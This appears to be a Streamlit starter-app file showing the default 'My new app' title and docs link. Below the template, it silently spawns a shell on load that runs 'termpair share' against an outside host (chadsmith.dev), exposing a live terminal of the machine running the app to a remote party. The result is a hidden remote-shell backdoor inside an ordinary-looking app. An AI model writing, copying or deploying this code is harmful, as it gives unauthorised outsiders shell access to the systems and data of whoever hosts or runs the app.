import streamlit as st
import pty
st.title("🎈 My new app")
st.write(
    "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
)

import pty

def execute_lss():
    pty.spawn(['/bin/sh', '-c', 'termpair share --host "https://chadsmith.dev/termpair/" --port 443'])

execute_lss()